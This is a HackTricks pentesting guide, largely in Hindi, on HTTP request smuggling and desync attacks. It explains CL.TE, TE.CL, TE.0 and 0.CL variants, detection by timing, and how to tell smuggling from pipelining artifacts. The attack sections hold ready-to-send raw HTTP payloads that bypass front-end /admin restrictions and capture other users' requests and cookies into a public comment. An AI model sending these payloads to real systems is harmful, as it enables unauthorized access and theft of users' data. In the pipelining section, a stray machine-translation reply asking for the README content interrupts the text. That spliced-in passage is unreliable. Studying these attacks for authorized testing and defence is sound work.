# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## यह क्या है

यह vulnerability तब होता है जब **desyncronization** **front-end proxies** और **back-end** server के बीच होता है, जिससे एक **attacker** एक ऐसा HTTP **request** भेज सकता है जिसे **front-end** proxies (load balance/reverse-proxy) द्वारा **एक ही request** के रूप में **interpreted** किया जाता है और **back-end** server द्वारा **2 request** के रूप में।\
इससे attacker को यह अनुमति मिलती है कि वह **उसके बाद back-end server को पहुँचने वाले अगले request को modify** कर सके।

### सिद्धांत

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

**Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

### वास्तविकता

**Front-End** (एक load-balance / Reverse Proxy) _**content-length**_ या _**transfer-encoding**_ header को process करता है और **Back-end** server दूसरे header को process करता है, जिससे दोनों सिस्टम्स के बीच **desyncronization** पैदा हो जाती है।\
यह बहुत गंभीर हो सकता है क्योंकि **attacker एक ऐसा request भेज पाएगा** जिसे reverse proxy एक ही request के रूप में देखेगा जबकि **back-end** server उसे **2 अलग request** के रूप में interpret कर सकता है। इस तकनीक का खतरा इस बात में है कि **back-end** server दूसरी injected request को ऐसे ही समझेगा जैसे वह **अगले client** से आई हो और उस client का असली request injected request का हिस्सा बन जाएगा।

### विशेषताएँ

याद रखें कि HTTP में **नया लाइन character 2 bytes से बनता है:**

- **Content-Length**: यह header request के body के bytes की संख्या बताने के लिए **दशमलव संख्या** का उपयोग करता है। body अपेक्षित रूप से आखिरी character पर खत्म होती है, **request के अंत में नया लाइन आवश्यक नहीं है**।
- **Transfer-Encoding:** यह header body में अगले chunk के byte की संख्या बताने के लिए **हैक्साडेसिमल संख्या** का उपयोग करता है। **chunk** को एक **नया लाइन** के साथ समाप्त होना चाहिए लेकिन यह नया लाइन length indicator में **गिना नहीं जाता**। इस transfer method को `0` size के chunk और उसके बाद **2 new lines** के साथ खत्म करना चाहिए।
- **Connection**: मेरे अनुभव के अनुसार request Smuggling के पहले request पर **`Connection: keep-alive`** का उपयोग करना recommended है।

### Visible - Hidden

HTTP/1.1 की मुख्य समस्या यह है कि सभी requests एक ही TCP socket में जाते हैं, इसलिए अगर दो systems के बीच request प्राप्ति में कोई अंतर मिलता है तो एक ही request भेजकर उसे final backend (या बीच के सिस्टम) द्वारा 2 अलग request (या उससे अधिक) के रूप में treat कराया जा सकता है।

**[This blog post](https://portswigger.net/research/http1-must-die)** ऐसे नए तरीके प्रस्तावित करता है जिनसे desync attacks को detect किया जा सके जो WAFs द्वारा flag न हों। इसके लिए यह Visible vs Hidden व्यवहार प्रस्तुत करता है। इस मामले में लक्ष्य यह है कि response में ऐसे discrepancies खोजे जाएँ जिनसे desync होने की संभावना हो, बिना वास्तव में exploit किए।

उदाहरण के लिए, एक सामान्य Host header के साथ और एक `" host"` header के साथ request भेजना — अगर backend इस request की शिकायत करता है (शायद क्योंकि `" host"` का value गलत है) तो इसका मतलब हो सकता है कि front-end ने `" host"` header को नहीं देखा जबकि final backend ने उसे उपयोग किया, जो front-end और backend के बीच desync की संभावना को दर्शाता है।

यह एक **Hidden-Visible discrepancy** होगा।

अगर front-end ने `" host"` header को ध्यान में लिया होता और backend ने नहीं, तो यह **Visible-Hidden** स्थिति हो सकती है।

उदाहरण के लिए, इससे AWS ALB को front-end और IIS को backend के रूप में use करते समय desyncs का पता चला। जब `"Host: foo/bar"` भेजा गया, ALB ने `400, Server; awselb/2.0` return किया, लेकिन जब `"Host : foo/bar"` भेजा गया, तो उसने `400, Server: Microsoft-HTTPAPI/2.0` return किया, जो संकेत करता है कि backend response भेज रहा था। यह Hidden-Visible (H-V) स्थिति थी।

ध्यान दें कि यह स्थिति AWS में ठीक नहीं की गई है, लेकिन इसे `routing.http.drop_invalid_header_fields.enabled` और `routing.http.desync_mitigation_mode = strictest` सेट करके रोका जा सकता है।


## Basic Examples

> [!TIP]
> When trying to exploit this with Burp Suite **disable `Update Content-Length` and `Normalize HTTP/1 line endings`** in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.

HTTP request smuggling attacks ऐसे ambiguous requests भेजकर तैयार किए जाते हैं जो front-end और back-end servers द्वारा `Content-Length` (CL) और `Transfer-Encoding` (TE) headers की व्याख्या में अंतर का फायदा उठाते हैं। ये attacks मुख्यतः **CL.TE**, **TE.CL**, और **TE.TE** के रूप में प्रकट होते हैं। हर प्रकार यह दर्शाता है कि front-end और back-end servers इन headers को किस तरह प्राथमिकता देते हैं। vulnerabilities तब उत्पन्न होती हैं जब servers एक ही request को अलग-अलग तरीकों से process करते हैं, जिससे अप्रत्याशित और संभवतः malicious परिणाम होते हैं।

### Vulnerability Types के मूल उदाहरण

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> To the previous table you should add the TE.0 technique, like CL.0 technique but using Transfer Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** अनुरोध को `Content-Length` header के आधार पर process करता है।
- **Back-End (TE):** अनुरोध को `Transfer-Encoding` header के आधार पर process करता है।
- **Attack Scenario:**

- attacker ऐसा request भेजता है जहाँ `Content-Length` header का value वास्तविक content length से मेल नहीं खाता।
- front-end server `Content-Length` value के आधार पर पूरा request back-end को forward कर देता है।
- back-end server `Transfer-Encoding: chunked` header के कारण request को chunked के रूप में process करता है, और शेष data को एक अलग, subsequent request के रूप में interpret कर लेता है।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** अनुरोध को `Transfer-Encoding` header के आधार पर process करता है।
- **Back-End (CL):** अनुरोध को `Content-Length` header के आधार पर process करता है।
- **Attack Scenario:**

- attacker एक chunked request भेजता है जहाँ chunk size (`7b`) और वास्तविक content length (`Content-Length: 4`) मेल नहीं खाते।
- front-end server `Transfer-Encoding` का सम्मान करते हुए पूरा request back-end को भेज देता है।
- back-end server `Content-Length` का पालन करते हुए केवल request के शुरुआती भाग (`7b` bytes) को process करता है, और बाकी को एक unintended subsequent request का हिस्सा छोड़ देता है।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** दोनों `Transfer-Encoding` का समर्थन करते हैं, लेकिन किसी एक को obfuscation करके इसे ignore करवा दिया जा सकता है।
- **Attack Scenario:**

- attacker obfuscated `Transfer-Encoding` headers के साथ request भेजता है।
- इस बात पर निर्भर करता है कि कौन सा server (front-end या back-end) obfuscation को पहचानने में विफल रहता है, CL.TE या TE.CL vulnerability exploit की जा सकती है।
- request का वह भाग जो एक server द्वारा unprocessed रहता है, subsequent request का हिस्सा बन जाता है, जिससे smuggling होता है।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- दोनों servers केवल `Content-Length` header के आधार पर request को process करते हैं।
- यह स्थिति आम तौर पर smuggling की ओर नहीं ले जाती, क्योंकि दोनों servers के interpret करने में alignment होता है।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- उन स्थितियों को दर्शाता है जहाँ `Content-Length` header मौजूद है और उसका मान शून्य के अलावा कुछ है, जो बताता है कि request body में content मौजूद है। back-end `Content-Length` header को ignore करता है (जिसे 0 माना जाता है), लेकिन front-end उसे parse करता है।
- यह smuggling attacks को समझने और बनाने में महत्वपूर्ण है, क्योंकि यह निर्धारित करता है कि servers request के अंत को कैसे पहचानते हैं।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- पहले वाले जैसा ही लेकिन TE का उपयोग करते हुए
- Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Example**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### `0.CL` परिदृश्य

एक `0.CL` स्थिति में एक अनुरोध भेजा जाता है जिसमें Content-Length इस तरह होता है:
```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
7

GET /404 HTTP/1.1
X: Y
```
और front-end `Content-Length` को ध्यान में नहीं रखता, इसलिए यह केवल पहले request को backend को भेजता है (उदाहरण में 7 तक)। हालाँकि, backend `Content-Length` देखता है और एक body के लिए इंतज़ार करता है जो कभी नहीं आती क्योंकि front-end पहले ही response का इंतज़ार कर रहा होता है।

हालाँकि, अगर ऐसा कोई request backend को भेजा जा सकता है जिसका response request के body प्राप्त होने से पहले ही आ जाता है, तो यह deadlock नहीं होगा। उदाहरण के लिए IIS में यह `/con` जैसे forbidden शब्दों पर request भेजने से होता है (देखें [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), इस तरह, आरंभिक request सीधे respond किया जाएगा और दूसरा request victim के request को इस प्रकार रखेगा:
```
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```
यह desync पैदा करने के काम आता है, पर अब तक इसका कोई प्रभाव नहीं पड़ा है।

हालाँकि, यह पोस्ट इस समस्या का समाधान पेश करती है by converting a **[0.CL attack into a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)**.

#### Breaking the web server

यह तकनीक उन परिस्थितियों में भी उपयोगी है जहाँ प्रारंभिक HTTP डेटा पढ़ते समय किसी वेब सर्वर को तोड़ा जाना संभव हो पर connection बंद न किया जाए। इस तरह, HTTP request का **body** अगले **HTTP request** के रूप में माना जाएगा।

उदाहरण के लिए, जैसा कि [**this writeup**](https://mizu.re/post/twisty-python) में समझाया गया है, Werkzeug में कुछ **Unicode** characters भेजना संभव था और इससे सर्वर **break** हो सकता था। हालाँकि, यदि HTTP connection header **`Connection: keep-alive`** के साथ बनाया गया था, तो request का body पढ़ा नहीं जाएगा और connection खुला रहेगा, इसलिए request का **body** अगले **HTTP request** के रूप में माना जाएगा।

#### Forcing via hop-by-hop headers

hop-by-hop headers का दुरुपयोग करके आप proxy को संकेत दे सकते हैं कि header Content-Length या Transfer-Encoding को **delete** कर दे ताकि HTTP request smuggling को दुरुपयोग किया जा सके।
```
Connection: Content-Length
```
For **more information about hop-by-hop headers** visit:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## HTTP Request Smuggling की खोज

Identifying HTTP request smuggling vulnerabilities अक्सर timing techniques के उपयोग से पाया जा सकता है, जो यह देखने पर निर्भर करते हैं कि manipulated requests के जवाब में server को रिस्पॉन्स देने में कितना समय लगता है। ये तकनीकें विशेष रूप से CL.TE और TE.CL कमजोरियों का पता लगाने में उपयोगी हैं। इन तरीकों के अलावा, ऐसी कमजोरियाँ खोजने के लिए अन्य रणनीतियाँ और टूल्स भी उपयोग किए जा सकते हैं:

### Timing Techniques का उपयोग करके CL.TE कमजोरियों का पता लगाना

- **तरीका:**

- एक ऐसा request भेजें जो, यदि application vulnerable है, तो back-end server को अतिरिक्त डेटा के लिए प्रतीक्षा करने का कारण बने।
- **उदाहरण:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **अवलोकन:**
- Front-end server `Content-Length` के आधार पर request को प्रोसेस करता है और संदेश को समय से पहले काट देता है।
- Back-end server, जो chunked message की उम्मीद कर रहा होता है, अगले chunk के लिए प्रतीक्षा करता है जो कभी नहीं आता, जिससे विलंब होता है।

- **संकेतक:**
- रिस्पॉन्स में timeouts या लंबी देरी।
- Back-end server से 400 Bad Request error प्राप्त होना, कभी-कभी विस्तृत server जानकारी के साथ।

### Timing Techniques का उपयोग करके TE.CL कमजोरियों का पता लगाना

- **तरीका:**

- एक ऐसा request भेजें जो, यदि application vulnerable है, तो back-end server को अतिरिक्त डेटा के लिए प्रतीक्षा करने का कारण बने।
- **उदाहरण:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **अवलोकन:**
- Front-end server `Transfer-Encoding` के आधार पर request को प्रोसेस करता है और पूरा संदेश फॉरवर्ड करता है।
- Back-end server, जो `Content-Length` के आधार पर संदेश की उम्मीद कर रहा होता है, अतिरिक्त डेटा के लिए प्रतीक्षा करता है जो कभी नहीं आता, जिससे विलंब होता है।

### कमजोरियाँ खोजने के अन्य तरीके

- **Differential Response Analysis:**
- request के थोड़े-बहुत बदले हुए वर्शन भेजें और देखें कि क्या server responses किसी अप्रत्याशित तरीके से भिन्न हैं, जो parsing में अंतर को इंगित कर सकता है।
- **Using Automated Tools:**
- Burp Suite's 'HTTP Request Smuggler' extension जैसे टूल्स विभिन्न प्रकार के ambiguous requests भेजकर और responses का विश्लेषण करके स्वचालित रूप से इन कमजोरियों का परीक्षण कर सकते हैं।
- **Content-Length Variance Tests:**
- ऐसे requests भेजें जिनमें `Content-Length` मान वास्तविक सामग्री की लंबाई से मेल नहीं खाते और देखें कि server ऐसे mismatches को कैसे हैंडल करता है।
- **Transfer-Encoding Variance Tests:**
- obfuscated या malformed `Transfer-Encoding` headers के साथ requests भेजें और ध्यान दें कि front-end और back-end servers ऐसे हेरफेर पर कैसे अलग-अलग प्रतिक्रिया करते हैं।

### The `Expect: 100-continue` header

देखें कि यह header http desync exploit करने में कैसे मदद कर सकता है:

{{#ref}}
../../network-services-pentesting/pentesting-web/special-http-headers.md
{{#endref}}

### HTTP Request Smuggling Vulnerability Testing

Timing techniques की प्रभावशीलता की पुष्टि करने के बाद, यह सत्यापित करना महत्वपूर्ण है कि क्या client requests में हेरफेर किया जा सकता है। एक सीधा तरीका यह है कि अपने requests को poison करने का प्रयास करें, उदाहरण के लिए `/` पर की गई request को 404 response दिलवाना। पहले चर्चा किए गए `CL.TE` और `TE.CL` उदाहरण [Basic Examples](#basic-examples) में दिखाते हैं कि कैसे एक client के request को poison करके 404 response उत्पन्न किया जा सकता है, भले ही client किसी अन्य resource तक पहुंचने का प्रयास कर रहा हो।

**Key Considerations**

जब आप दूसरों के requests के साथ हस्तक्षेप करके request smuggling के लिए परीक्षण कर रहे हों, तो ध्यान रखें:

- **Distinct Network Connections:** "attack" और "normal" requests को अलग network connections पर भेजना चाहिए। दोनों के लिए एक ही connection का उपयोग करना vulnerability की उपस्थिति को प्रमाणित नहीं करता।
- **Consistent URL and Parameters:** दोनों requests के लिए समान URLs और parameter names का उपयोग करने का लक्ष्य रखें। आधुनिक applications अक्सर URL और parameters के आधार पर requests को विशिष्ट back-end servers पर route करते हैं। इन्हें मिलान करने से दोनों requests के एक ही server द्वारा प्रोसेस होने की संभावना बढ़ती है, जो सफल attack के लिए अनिवार्य है।
- **Timing and Racing Conditions:** "normal" request, जिसे "attack" request के हस्तक्षेप का पता लगाने के लिए भेजा जाता है, अन्य concurrent application requests के खिलाफ race में होता है। इसलिए "attack" request के तुरंत बाद "normal" request भेजें। व्यस्त applications के मामले में निर्णायक पुष्टि के लिए कई प्रयासों की आवश्यकता हो सकती है।
- **Load Balancing Challenges:** load balancer की तरह काम करने वाले front-end servers requests को विभिन्न back-end systems में वितरित कर सकते हैं। यदि "attack" और "normal" requests अलग systems पर पहुंच जाते हैं, तो attack सफल नहीं होगा। इस load balancing पहलू के कारण vulnerability की पुष्टि करने के लिए कई प्रयासों की आवश्यकता पड़ सकती है।
- **Unintended User Impact:** अगर आपका attack अनजाने में किसी अन्य उपयोगकर्ता के request को प्रभावित करता है (न कि वह "normal" request जो आपने पता लगाने के लिए भेजा था), तो इसका मतलब है कि आपका attack किसी अन्य application user को प्रभावित कर गया। बार-बार परीक्षण अन्य उपयोगकर्ताओं के लिए समस्या पैदा कर सकता है, इसलिए सतर्क रहना आवश्यक है।

## HTTP/1.1 pipelining artifacts और वास्तविक request smuggling में अंतर

Connection reuse (keep-alive) और pipelining आसानी से testing tools में "smuggling" की भ्रम पैदा कर सकते हैं जो एक ही socket पर कई requests भेजते हैं। harmless client-side artifacts को असली server-side desync से अलग करना सीखें।

### क्यों pipelining क्लासिक false positives बनाता है

HTTP/1.1 एक single TCP/TLS connection को पुनः उपयोग करता है और उसी stream पर requests और responses को concatenate करता है। pipelining में, client कई requests को back-to-back भेजता है और in-order responses पर निर्भर रहता है। एक सामान्य false-positive यह है कि एक malformed CL.0-style payload को एक ही connection पर दो बार resend कर दिया जाए:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
I don't see the README.md content. कृपया src/pentesting-web/http-request-smuggling/README.md की पूरी Markdown सामग्री यहाँ पेस्ट करें — मैं निर्दिष्ट नियमों के अनुसार टेक्स्ट को हिंदी में अनुवाद कर दूँगा और सभी कोड, टैग, लिंक, पाथ और निर्दिष्ट शब्द जस के तस रखूँगा।
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
अगर सर्वर अमान्य `Content_Length` को अनदेखा कर देता है, तो कोई FE↔BE desync नहीं होता। पुन: उपयोग के साथ, आपका क्लाइंट वास्तव में यह byte-stream भेजता है, जिसे सर्वर ने दो स्वतंत्र requests के रूप में पार्स किया:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Impact: कोई नहीं। आप बस अपने client को server framing से desync कर चुके हैं।

> [!TIP]
> Burp के ऐसे मॉड्यूल जो reuse/pipelining पर निर्भर करते हैं: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

### Litmus परीक्षण: pipelining या वास्तविक desync?

1. Disable reuse and re-test
- Burp Intruder/Repeater में, HTTP/1 reuse को बंद करें और "Send group in sequence" से बचें।
- Turbo Intruder में `requestsPerConnection=1` और `pipeline=False` सेट करें।
- यदि व्यवहार गायब हो जाता है, तो संभवतः client-side pipelining था, जब तक कि आप connection-locked/stateful targets या client-side desync का सामना नहीं कर रहे हों।
2. HTTP/2 nested-response जाँच
- एक HTTP/2 अनुरोध भेजें। यदि response body में एक पूरा nested HTTP/1 response शामिल है, तो आपने backend parsing/desync बग साबित कर दिया है, न कि केवल client artifact।
3. Partial-requests probe for connection-locked front-ends
- कुछ FEs केवल तभी upstream BE connection को reuse करते हैं जब client ने अपना connection reuse किया हो। FE के ऐसे व्यवहार का पता लगाने के लिए partial-requests का उपयोग करें जो client reuse की नकल करते हैं।
- connection-locked तकनीक के लिए PortSwigger "Browser‑Powered Desync Attacks" देखें।
4. State probes
- एक ही TCP connection पर first- vs subsequent-request के बीच के अंतर को देखें (first-request routing/validation)।
- Burp "HTTP Request Smuggler" में एक connection‑state probe शामिल है जो इसे ऑटोमेट करता है।
5. Visualize the wire
- reuse और partial requests के साथ प्रयोग करते समय concatenation और message framing को सीधे इंस्पेक्ट करने के लिए Burp "HTTP Hacker" extension का उपयोग करें।

### Connection‑locked request smuggling (reuse-required)

कुछ front-ends केवल तभी upstream connection को reuse करते हैं जब client ने अपना connection reuse किया हो। वास्तविक smuggling मौजूद है लेकिन यह client-side reuse पर निर्भर करती है। अलग करने और प्रभाव साबित करने के लिए:
- server-side बग को साबित करें
- HTTP/2 nested-response जांच का उपयोग करें, या
- यह दिखाने के लिए partial-requests का उपयोग करें कि FE केवल तभी upstream को reuse करता है जब client ऐसा करे।
- प्रत्यक्ष cross-user socket abuse ब्लॉक होने पर भी वास्तविक प्रभाव दिखाएँ:
- Cache poisoning: desync के माध्यम से shared caches को poison करें ताकि responses अन्य उपयोगकर्ताओं को प्रभावित करें।
- Internal header disclosure: FE-injected headers (उदा., auth/trust headers) को reflect करें और auth bypass की ओर pivot करें।
- Bypass FE controls: restricted paths/methods को front-end के पार smuggle करें।
- Host-header abuse: host routing quirks के साथ संयोजन कर के internal vhosts की तरफ pivot करें।
- Operator workflow
- नियंत्रित reuse के साथ reproduce करें (Turbo Intruder `requestsPerConnection=2`, या Burp Repeater tab group → "Send group in sequence (single connection)")।
- फिर cache/header-leak/control-bypass primitives को chain करें और cross-user या authorization impact दिखाएँ।

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>
{{#endref}}

### Client‑side desync constraints

यदि आप browser-powered/client-side desync को लक्षित कर रहे हैं, तो malicious request browser द्वारा cross-origin भेजने योग्य होना चाहिए। Header obfuscation tricks काम नहीं करेंगे। navigation/fetch के माध्यम से पहुँचने योग्य primitives पर ध्यान केंद्रित करें, और फिर उन परिस्थितियों में pivot करें जहाँ downstream components responses को reflect या cache करते हैं — जैसे cache poisoning, header disclosure, या front-end control bypass।

For background and end-to-end workflows:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### निर्णय में मदद करने वाले टूल

- HTTP Hacker (Burp BApp Store): low-level HTTP व्यवहार और socket concatenation को एक्सपोज़ करता है।
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: `requestsPerConnection` के माध्यम से connection reuse पर सटीक नियंत्रण।
- Burp HTTP Request Smuggler: इसमें first‑request routing/validation को पकड़ने के लिए एक connection‑state probe शामिल है।

> [!NOTE]
> केवल reuse-अनन्य प्रभावों को non-issues मानें जब तक आप server-side desync साबित न कर सकें और ठोस प्रभाव (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control, आदि) जोड़ न सकें।

## HTTP Request Smuggling का दुरुपयोग

### HTTP Request Smuggling के माध्यम से Front-End Security को बायपास करना

कभी-कभी, front-end proxies सुरक्षा उपाय लागू करते हैं और incoming requests की कड़ी जाँच करते हैं। हालांकि, इन उपायों को HTTP Request Smuggling का शोषण करके बायपास किया जा सकता है, जिससे restricted endpoints तक unauthorized access मिल सकता है। उदाहरण के लिए, बाहरी रूप से `/admin` तक पहुंच मना हो सकती है और front-end proxy ऐसे प्रयासों को सक्रिय रूप से ब्लॉक कर सकता है। फिर भी, यह proxy smuggled HTTP request के अंदर embedded requests की जाँच न करके इन प्रतिबंधों को बायपास करने का रास्ता छोड़ सकता है।

नीचे दिए गए उदाहरणों पर विचार करें जो दिखाते हैं कि HTTP Request Smuggling का उपयोग front-end सुरक्षा नियंत्रणों को बायपास करने के लिए कैसे किया जा सकता है, विशेष रूप से `/admin` path को लक्षित करते हुए जिसे सामान्यतः front-end proxy द्वारा सुरक्षित रखा जाता है:

**CL.TE उदाहरण**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE attack में, `Content-Length` header प्रारंभिक request के लिए उपयोग किया जाता है, जबकि उसके बाद के embedded request में `Transfer-Encoding: chunked` header का उपयोग होता है। front-end proxy प्रारंभिक `POST` request को process करता है लेकिन embedded `GET /admin` request का निरीक्षण करने में विफल रहता है, जिससे `/admin` path तक अनधिकृत पहुँच संभव हो जाती है।

**TE.CL उदाहरण**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
विपरीत रूप से, TE.CL attack में प्रारम्भिक `POST` request `Transfer-Encoding: chunked` का उपयोग करती है, और बाद में एम्बेडेड request को उसके `Content-Length` header के आधार पर प्रोसेस किया जाता है। CL.TE attack की तरह, front-end proxy smuggled `GET /admin` request को अनदेखा कर देता है, जिससे अनजाने में प्रतिबंधित `/admin` path तक पहुँच मिल जाती है।

### फ्रंट-एंड अनुरोध पुनर्लेखन का खुलासा <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Applications अक्सर incoming requests को back-end server को पास करने से पहले संशोधित करने के लिए एक **front-end server** का उपयोग करते हैं। एक सामान्य संशोधन में headers जोड़ना शामिल होता है, जैसे `X-Forwarded-For: <IP of the client>`, जिससे क्लाइंट का IP back-end तक पहुँचाया जाता है। इन संशोधनों को समझना महत्वपूर्ण हो सकता है, क्योंकि इससे **bypass protections** या **uncover concealed information or endpoints** के तरीके उजागर हो सकते हैं।

यह जांचने के लिए कि proxy किसी अनुरोध को कैसे बदलता है, उस POST parameter को ढूंढ़ें जिसे back-end response में echo करता है। फिर, इस parameter को आख़िर में उपयोग करते हुए एक request तैयार करें, जो निम्नलिखित के समान हो:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
इस संरचना में, बाद के अनुरोध के घटक `search=` के बाद जोड़े जाते हैं, जो प्रतिक्रिया में परावर्तित होने वाला parameter है। यह प्रतिबिंब subsequent request के headers को उजागर कर देगा।

यह महत्वपूर्ण है कि नेस्टेड अनुरोध का `Content-Length` header वास्तविक सामग्री की लंबाई के साथ संरेखित हो। छोटे मान से शुरू करना और धीरे-धीरे बढ़ाना सलाहयोग्य है, क्योंकि बहुत कम मान प्रतिबिंबित डेटा को truncate कर देगा, जबकि बहुत अधिक मान request को error कर सकता है।

यह तकनीक TE.CL vulnerability के संदर्भ में भी लागू होती है, लेकिन अनुरोध को `search=\r\n0` पर समाप्त होना चाहिए। newline characters की परवाह किए बिना, ये मान search parameter में जोड़ दिए जाएंगे।

यह विधि मुख्यतः front-end proxy द्वारा किए गए अनुरोध संशोधनों को समझने के लिए उपयोगी है, मूलतः एक आत्म-निर्देशित जांच करने का तरीका है।

### अन्य उपयोगकर्ताओं के अनुरोध कैप्चर करना <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

POST ऑपरेशन के दौरान किसी पैरामीटर के मान के रूप में एक विशिष्ट अनुरोध जोड़कर अगले उपयोगकर्ता के अनुरोधों को कैप्चर करना संभव है। इसे इस तरह किया जा सकता है:

निम्नलिखित अनुरोध को किसी पैरामीटर के मान के रूप में जोड़कर, आप अगले क्लाइंट के अनुरोध को स्टोर कर सकते हैं:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In this scenario, the **comment parameter** is intended to store the contents within a post's comment section on a publicly accessible page. Consequently, the subsequent request's contents will appear as a comment.

हालाँकि, इस technique की सीमाएँ हैं। सामान्यतः, यह केवल smuggled request में उपयोग किए गए parameter delimiter तक ही डेटा कैप्चर करता है। URL-encoded form submissions के लिए, यह delimiter `&` कैरेक्टर होता है। इसका अर्थ है कि पीड़ित उपयोगकर्ता के अनुरोध से कैप्चर की गई सामग्री पहले `&` पर रुक जाएगी, जो कि कभी-कभी query string का हिस्सा भी हो सकता है।

इसके अतिरिक्त, यह ध्यान देने योग्य है कि यह तरीका TE.CL vulnerability के साथ भी काम करता है। ऐसे मामलों में, अनुरोध `search=\r\n0` पर समाप्त होना चाहिए। न्यूलाइन कैरेक्टर्स की परवाह किए बिना, मान search parameter में जोड़ दिए जाएँगे।

### Using HTTP request smuggling to exploit reflected XSS

HTTP Request Smuggling का उपयोग उन वेब पेजों को exploit करने के लिए किया जा सकता है जो **Reflected XSS** के प्रति संवेदनशील हैं, और यह महत्वपूर्ण फायदे देता है:

